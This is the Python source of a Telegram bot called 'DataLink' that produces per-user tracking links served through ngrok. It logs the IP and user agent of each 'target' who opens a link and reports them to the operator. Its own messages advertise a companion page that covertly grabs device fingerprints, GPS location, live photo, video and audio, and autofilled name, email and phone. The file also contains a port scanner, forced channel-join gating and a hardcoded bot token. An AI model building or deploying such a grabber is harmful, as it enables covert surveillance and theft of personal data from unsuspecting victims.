#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
 DataLink  v8  ·  0-tap deep scan · force-join
============================================================
 /d/<uid>  ->  DataLink scan page

 Install: pip install python-telegram-bot aiohttp pyngrok
 Run    : python bot.py
============================================================
"""

import asyncio, datetime, os, random, re, socket, string, time
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (ApplicationBuilder, CommandHandler, CallbackQueryHandler,
                          MessageHandler, filters, ContextTypes)

# ============================================================
#  CONFIG
# ============================================================
BOT_TOKEN = "8657114882:AAFA-GDUEnKphnObFoxj6rlKiAddQZ4qK_0"

BRAND      = "DataLink"          # <<< apna naam yahan badlo
TAGLINE    = "Instant device & identity scan"

CHANNELS   = ["@hchedc"]
JOIN_LINKS = {}
BYPASS_OWNER = True
CACHE_SEC    = 60

OWNER_ID        = None
PORT            = 8080
SEND_TO_OWNER   = False
USE_NGROK       = True
NGROK_DOMAIN    = ""
NGROK_AUTHTOKEN = ""

REDIRECT = "https://www.google.com"

# ============================================================
#  PORT SCAN
# ============================================================
COMMON_PORTS = [21,22,23,25,53,80,110,143,443,465,587,993,995,
                3306,3389,5432,6379,8080,8443,27017]
PORT_TIMEOUT = 0.6
MAX_WORKERS  = 100
DOMAIN_REGEX = r"^(?!\-)(?:[a-zA-Z0-9\-]{1,63}\.)+[a-zA-Z]{2,}$"
IP_REGEX     = r"^(\d{1,3}\.){3}\d{1,3}$"

BASE_URL    = ""
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
KNOWN_USERS = set()
TARGETS     = defaultdict(lambda: deque(maxlen=60))
TOTAL_HITS  = defaultdict(int)
_join_cache = {}

# ============================================================
#  HELPERS
# ============================================================
def read_page(n):
    with open(os.path.join(BASE_DIR, n), "r", encoding="utf-8") as f: return f.read()

def render(tpl, uid, ip, sid):
    return (tpl.replace("{{BOT_TOKEN}}", BOT_TOKEN)
               .replace("{{OWNER_ID}}",  str(OWNER_ID or ""))
               .replace("{{UID}}",       str(uid or ""))
               .replace("{{TARGET_IP}}", ip or "")
               .replace("{{SID}}",       sid)
               .replace("{{BRAND}}",     BRAND)
               .replace("{{TAGLINE}}",   TAGLINE)
               .replace("{{REDIRECT}}",  REDIRECT))

def is_valid_domain(t): return bool(re.match(DOMAIN_REGEX, t.strip()))
def is_valid_ip(t):
    if not re.match(IP_REGEX, t.strip()): return False
    return all(0 <= int(p) <= 255 for p in t.split("."))
def clean_input(t):
    t = t.strip().lower(); t = re.sub(r"^https?://", "", t); return t.split("/")[0]
def resolve_ip(d):
    try:    return socket.gethostbyname(d)
    except socket.gaierror: return None
def reverse_dns(ip):
    try:    return socket.gethostbyaddr(ip)[0]
    except Exception: return None

def _check_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(PORT_TIMEOUT)
    try:    return port if s.connect_ex((ip, port)) == 0 else None
    except Exception: return None
    finally: s.close()

def scan_ports(ip):
    out = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        for f in as_completed({ex.submit(_check_port, ip, p): p for p in COMMON_PORTS}):
            r = f.result()
            if r: out.append(r)
    return sorted(out)

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:    s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    except Exception: return "127.0.0.1"
    finally: s.close()

def new_sid(): return "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
def qr_url(d): return "https://api.qrserver.com/v1/create-qr-code/?size=500x500&margin=10&data=" + quote(d, safe="")
def dlink(uid): return f"{BASE_URL}/d/{uid}"
def hits(uid):  return TOTAL_HITS.get(str(uid), 0)

# ============================================================
#  FORCE JOIN
# ============================================================
def ch_link(ch): return JOIN_LINKS.get(ch) or ("https://t.me/" + ch.lstrip("@"))

async def is_member(uid, ch):
    k, now = (str(uid), ch), time.time()
    if k in _join_cache and now - _join_cache[k][1] < CACHE_SEC: return _join_cache[k][0]
    try:
        m = await tg_app.bot.get_chat_member(ch, uid)
        ok = m.status in ("member","administrator","creator","restricted")
    except Exception:
        ok = True
    _join_cache[k] = (ok, now); return ok

async def joined(uid):
    if not CHANNELS: return True
    if BYPASS_OWNER and OWNER_ID and str(uid) == str(OWNER_ID): return True
    for ch in CHANNELS:
        if not await is_member(uid, ch): return False
    return True

def join_kb():
    rows = [[InlineKeyboardButton("📢 Join Channel", url=ch_link(ch))] for ch in CHANNELS]
    rows.append([InlineKeyboardButton("✅ Joined — Verify karo", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

JOIN_MSG = ("🔒 *Pehle channel join karo!*\n\n"
            "Bot ka pura access lene ke liye channel join karna zaroori hai.\n\n"
            "1️⃣ Join dabao\n2️⃣ Wapas aake *Verify* dabao")

async def gate(t, uid):
    if await joined(uid): return True
    if hasattr(t, "edit_message_text"):
        try: await t.edit_message_text(JOIN_MSG, parse_mode="Markdown", reply_markup=join_kb())
        except Exception: await t.message.reply_text(JOIN_MSG, parse_mode="Markdown", reply_markup=join_kb())
    else:
        await t.reply_text(JOIN_MSG, parse_mode="Markdown", reply_markup=join_kb())
    return False

# ============================================================
#  MENU
# ============================================================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 " + BRAND + " LINK", callback_data="dlink")],
        [InlineKeyboardButton("🌐 IP Check",           callback_data="ip_check")],
        [InlineKeyboardButton("🔌 Port Check",         callback_data="port_check")],
        [InlineKeyboardButton("⚡ IP + Port Combo",     callback_data="both_check")],
    ])

def back_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
MODES = {"ip_check":"🌐 IP Check","port_check":"🔌 Port Check","both_check":"⚡ IP + Port Combo"}
WELCOME = "✅ *Verified!*\n\nNeeche se chuno 👇"

# ============================================================
#  HANDLERS
# ============================================================
async def start(update, context):
    global OWNER_ID
    uid = update.effective_chat.id
    if OWNER_ID is None: OWNER_ID = str(uid)
    KNOWN_USERS.add(str(uid)); context.user_data.clear()
    if not await gate(update.message, uid): return
    await update.message.reply_text(WELCOME, parse_mode="Markdown", reply_markup=main_menu())

async def cmd_join(update, context):
    uid = update.effective_chat.id; KNOWN_USERS.add(str(uid)); _join_cache.clear()
    if await joined(uid):
        await update.message.reply_text("✅ Aap joined ho.", reply_markup=main_menu())
    else:
        await update.message.reply_text(JOIN_MSG, parse_mode="Markdown", reply_markup=join_kb())

async def cmd_id(update, context):
    KNOWN_USERS.add(str(update.effective_chat.id))
    await update.message.reply_text(f"🆔 `{update.effective_chat.id}`", parse_mode="Markdown")

async def cmd_link(update, context):
    uid = update.effective_chat.id; KNOWN_USERS.add(str(uid))
    if not await gate(update.message, uid): return
    await update.message.reply_text(
        f"🔗 *{BRAND}*\n\n" + dlink(uid) +
        f"\n\n📊 Hits: {hits(uid)}\n\n"
        "Target link kholega — kuch kiye bina hi uska data aana shuru ho jayega:\n"
        "📱 Device · 🖥️ GPU · 🌐 IP+ISP · 📍 Location · 📸 Live photo · 🎥 Video\n"
        "👤 Naam · 📧 Email · ☎️ Phone (browser autofill se)",
        parse_mode="Markdown", disable_web_page_preview=True)

async def cmd_qr(update, context):
    uid = update.effective_chat.id; KNOWN_USERS.add(str(uid))
    if not await gate(update.message, uid): return
    await update.message.reply_photo(qr_url(dlink(uid)), caption=f"📱 {BRAND} QR\n" + dlink(uid))

async def cmd_stats(update, context):
    uid = str(update.effective_chat.id); KNOWN_USERS.add(uid)
    await update.message.reply_text(f"📊 *STATS*\n\nTotal hits: `{TOTAL_HITS.get(uid,0)}`",
                                    parse_mode="Markdown")

async def cmd_targets(update, context):
    uid = str(update.effective_chat.id); KNOWN_USERS.add(uid)
    lst = list(TARGETS.get(uid, []))
    if not lst: await update.message.reply_text("Abhi koi hit nahi."); return
    lines = ["🧾 *RECENT TARGETS*", ""]
    for h in lst[:12]: lines.append(f"[{h['sid']}] {h['tag']}\n  🌐 {h['ip']}\n  🕒 {h['t']}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown", disable_web_page_preview=True)

async def cmd_clear(update, context):
    uid = str(update.effective_chat.id); TARGETS[uid].clear(); TOTAL_HITS[uid] = 0
    await update.message.reply_text("🧹 Clear.")

async def cmd_users(update, context):
    await update.message.reply_text(f"👥 Users: `{len(KNOWN_USERS)}`", parse_mode="Markdown")

async def cmd_broadcast(update, context):
    uid = str(update.effective_chat.id)
    if OWNER_ID and uid != str(OWNER_ID): await update.message.reply_text("Sirf owner."); return
    if not context.args: await update.message.reply_text("Use: `/broadcast msg`", parse_mode="Markdown"); return
    ok = 0
    for c in list(KNOWN_USERS):
        try: await tg_app.bot.send_message(chat_id=c, text="📢 " + " ".join(context.args)); ok += 1
        except Exception: pass
    await update.message.reply_text(f"📢 Sent to {ok}")

async def cmd_help(update, context):
    KNOWN_USERS.add(str(update.effective_chat.id))
    await update.message.reply_text(
        "📖 *Commands*\n/start · /link · /qr · /join · /stats · /targets · /clear · /id\n"
        "/users · /broadcast msg", parse_mode="Markdown")

async def button_handler(update, context):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; KNOWN_USERS.add(str(uid))

    if q.data == "verify_join":
        _join_cache.clear()
        if await joined(uid):
            await q.edit_message_text(WELCOME, parse_mode="Markdown", reply_markup=main_menu())
        else:
            await q.edit_message_text("❌ Abhi join nahi hua. Join karke dobara *Verify* dabao.",
                                      parse_mode="Markdown", reply_markup=join_kb())
        return
    if not await gate(q, uid): return

    if q.data in MODES:
        context.user_data["mode"] = q.data
        await q.edit_message_text(f"{MODES[q.data]} chuna.\n\nAb domain bhejo (jaise google.com).",
                                  reply_markup=back_kb())
    elif q.data == "dlink":
        await q.edit_message_text(
            f"🔗 *{BRAND}*\n\n" + dlink(uid) +
            f"\n\n📊 Hits: {hits(uid)}\n\nTarget ne kuch nahi kiya, phir bhi aayega:\n"
            "📱 Device model · GPU · CPU · RAM · Battery\n"
            "🌐 IP · City · ISP · ASN · Local IP · Speed\n"
            "🧬 Canvas/WebGL/Audio fingerprint · VPN detect\n"
            "📍 GPS location + address (1 tap)\n"
            "📸 Live photo + video + awaaz (1 tap)\n"
            "👤 Naam · Email · Phone · Address (autofill, 0 typing)",
            parse_mode="Markdown", disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📱 QR", callback_data="dqr")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "dqr":
        await q.message.reply_photo(qr_url(dlink(uid)), caption=f"📱 {BRAND} QR\n" + dlink(uid))
    elif q.data == "back":
        context.user_data.clear()
        await q.edit_message_text("🏠 Menu:", reply_markup=main_menu())

async def handle_message(update, context):
    uid = update.effective_chat.id; KNOWN_USERS.add(str(uid))
    mode = context.user_data.get("mode")
    if not mode:
        if not await gate(update.message, uid): return
        await update.message.reply_text("Pehle /start karo.", reply_markup=main_menu()); return

    t = clean_input(update.message.text)
    if is_valid_ip(t): ip = t; domain = reverse_dns(ip) or "N/A"
    elif is_valid_domain(t):
        domain = t; ip = resolve_ip(domain)
        if not ip:
            await update.message.reply_text(f"❌ '{domain}' resolve nahi hua.", reply_markup=back_kb()); return
    else:
        await update.message.reply_text("❌ Invalid domain/IP.", reply_markup=back_kb()); return

    if mode == "ip_check":
        await update.message.reply_text(f"🌐 *IP Check*\n\nDomain: `{domain}`\nIP: `{ip}`",
                                        parse_mode="Markdown", reply_markup=back_kb())
    else:
        msg = await update.message.reply_text(f"🔍 `{ip}` scan...", parse_mode="Markdown")
        op = await asyncio.get_event_loop().run_in_executor(None, scan_ports, ip)
        ptxt = ", ".join(f"`{p}`" for p in op) if op else "Koi open port nahi"
        txt = (f"🔌 *Port Check*\n\nIP: `{ip}`\n✅ Open: {ptxt}" if mode=="port_check"
               else f"⚡ *IP + Port*\n\nDomain: `{domain}`\nIP: `{ip}`\n✅ Open: {ptxt}")
        await msg.edit_text(txt, parse_mode="Markdown", reply_markup=back_kb())

# ============================================================
#  WEB
# ============================================================
tg_app = None

async def notify(uid, text):
    ids = set()
    if uid: ids.add(str(uid))
    if SEND_TO_OWNER and OWNER_ID: ids.add(str(OWNER_ID))
    for c in ids:
        try: await tg_app.bot.send_message(chat_id=c, text=text, disable_web_page_preview=True)
        except Exception: pass

def log_hit(uid, sid, ip, ua):
    if not uid: return
    TARGETS[str(uid)].appendleft({"sid":sid,"ip":ip,"ua":ua[:120],"tag":BRAND,
        "t":datetime.datetime.now().strftime("%d-%m %H:%M:%S")})
    TOTAL_HITS[str(uid)] += 1

async def route_dlink(request):
    uid = request.match_info.get("uid", "")
    ip  = request.headers.get("X-Forwarded-For", request.remote or "").split(",")[0].strip()
    ua  = request.headers.get("User-Agent", "")
    sid = new_sid()
    if uid:
        log_hit(uid, sid, ip, ua)
        asyncio.create_task(notify(uid,
            f"[{sid}] 🚀 TARGET NE {BRAND.upper()} KHOLA\n━━━━━━━━━━━━━━━━━━━━\n"
            f"IP: {ip}\nUA: {ua[:150]}\nTime: {datetime.datetime.now().isoformat()}"))
    return web.Response(text=render(read_page("index.html"), uid, ip, sid),
                        content_type="text/html")

async def route_index(request): return await route_dlink(request)
async def route_health(request): return web.Response(text="OK")

def build_web_app():
    a = web.Application()
    a.router.add_get("/", route_index)
    a.router.add_get("/d/{uid}", route_dlink)
    a.router.add_get("/health", route_health)
    return a

# ============================================================
#  BOOT
# ============================================================
async def check_channels():
    if not CHANNELS: return
    me = await tg_app.bot.get_me()
    for ch in CHANNELS:
        try:
            m = await tg_app.bot.get_chat_member(ch, me.id)
            print(f"✅ Channel OK: {ch} ({m.status})")
            if m.status not in ("administrator","creator"):
                print(f"   ⚠️ Bot '{ch}' me ADMIN nahi hai")
        except Exception as e:
            print(f"❌ Channel '{ch}': {e}")

async def main():
    global BASE_URL, tg_app
    if USE_NGROK:
        try:
            from pyngrok import ngrok, conf
            if NGROK_AUTHTOKEN: conf.get_default().auth_token = NGROK_AUTHTOKEN
            kw = {"domain": NGROK_DOMAIN} if NGROK_DOMAIN else {}
            BASE_URL = ngrok.connect(PORT, "http", **kw).public_url.replace("http://", "https://")
        except Exception as e:
            print("⚠️ ngrok fail:", e); BASE_URL = f"http://{get_lan_ip()}:{PORT}"
    else:
        BASE_URL = f"http://{get_lan_ip()}:{PORT}"

    tg_app = ApplicationBuilder().token(BOT_TOKEN).build()
    for cmd, fn in [("start",start),("link",cmd_link),("qr",cmd_qr),("join",cmd_join),
                    ("stats",cmd_stats),("targets",cmd_targets),("clear",cmd_clear),
                    ("users",cmd_users),("broadcast",cmd_broadcast),("id",cmd_id),("help",cmd_help)]:
        tg_app.add_handler(CommandHandler(cmd, fn))
    tg_app.add_handler(CallbackQueryHandler(button_handler))
    tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    await tg_app.initialize(); await tg_app.start(); await tg_app.updater.start_polling()

    print("=" * 58); print(f"✅ {BRAND} live"); print("🔗", BASE_URL + "/d/12345")
    await check_channels(); print("=" * 58)

    runner = web.AppRunner(build_web_app()); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\n👋 Band")